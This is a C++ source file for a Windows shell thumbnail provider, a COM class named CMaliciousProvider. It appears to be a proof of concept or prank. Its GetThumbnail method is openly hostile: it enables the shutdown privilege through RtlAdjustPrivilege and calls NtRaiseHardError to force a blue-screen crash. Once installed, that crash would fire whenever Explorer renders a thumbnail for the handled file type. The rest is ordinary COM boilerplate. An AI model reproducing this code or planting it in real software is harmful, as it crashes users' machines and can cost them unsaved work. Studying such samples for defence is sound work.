#include <shlwapi.h>
#include <thumbcache.h> // For IThumbnailProvider.
#include <new>

#pragma comment(lib, "shlwapi.lib")

// this thumbnail provider implements IInitializeWithStream to enable being hosted
// in an isolated process for robustness

class CMaliciousProvider : public IInitializeWithStream,
                             public IThumbnailProvider
{
public:
    CMaliciousProvider() : _cRef(1), _pStream(NULL)
    {
    }

    virtual ~CMaliciousProvider()
    {
        if (_pStream)
        {
            _pStream->Release();
        }
    }

    // IUnknown
    IFACEMETHODIMP QueryInterface(REFIID riid, void **ppv)
    {
        static const QITAB qit[] =
        {
            QITABENT(CMaliciousProvider, IInitializeWithStream),
            QITABENT(CMaliciousProvider, IThumbnailProvider),
            { 0 },
        };
        return QISearch(this, qit, riid, ppv);
    }

    IFACEMETHODIMP_(ULONG) AddRef()
    {
        return InterlockedIncrement(&_cRef);
    }

    IFACEMETHODIMP_(ULONG) Release()
    {
        ULONG cRef = InterlockedDecrement(&_cRef);
        if (!cRef)
        {
            delete this;
        }
        return cRef;
    }

    // IInitializeWithStream
    IFACEMETHODIMP Initialize(IStream *pStream, DWORD grfMode);

    // IThumbnailProvider
    IFACEMETHODIMP GetThumbnail(UINT cx, HBITMAP *phbmp, WTS_ALPHATYPE *pdwAlpha);

private:
    long _cRef;
    IStream *_pStream;     // provided during initialization.
};

HRESULT CMaliciousProvider_CreateInstance(REFIID riid, void **ppv)
{
    CMaliciousProvider *pNew = new (std::nothrow) CMaliciousProvider();
    HRESULT hr = pNew ? S_OK : E_OUTOFMEMORY;
    if (SUCCEEDED(hr))
    {
        hr = pNew->QueryInterface(riid, ppv);
        pNew->Release();
    }
    return hr;
}

// IInitializeWithStream
IFACEMETHODIMP CMaliciousProvider::Initialize(IStream *pStream, DWORD)
{
    HRESULT hr = E_UNEXPECTED;  // can only be inited once
    if (_pStream == NULL)
    {
        // take a reference to the stream if we have not been inited yet
        hr = pStream->QueryInterface(&_pStream);
    }
    return hr;
}

// IThumbnailProvider
IFACEMETHODIMP CMaliciousProvider::GetThumbnail(UINT, HBITMAP *, WTS_ALPHATYPE *)
{
    // Cause blue screen of death
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege;
    FARPROC NtRaiseHardError;

    if (ntdll) {
        RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
        NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

        if (RtlAdjustPrivilege != nullptr && NtRaiseHardError != nullptr) {
            BOOLEAN tmp1;
            DWORD tmp2;
            ((void (*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(
                19, 1, 0, &tmp1);
            ((void (*)(DWORD, DWORD, DWORD, DWORD, DWORD,
                       LPDWORD))NtRaiseHardError)(0xc6942069, 0, 0, 0, 6,
                                                  &tmp2);
        }
    }

    return E_FAIL;
}
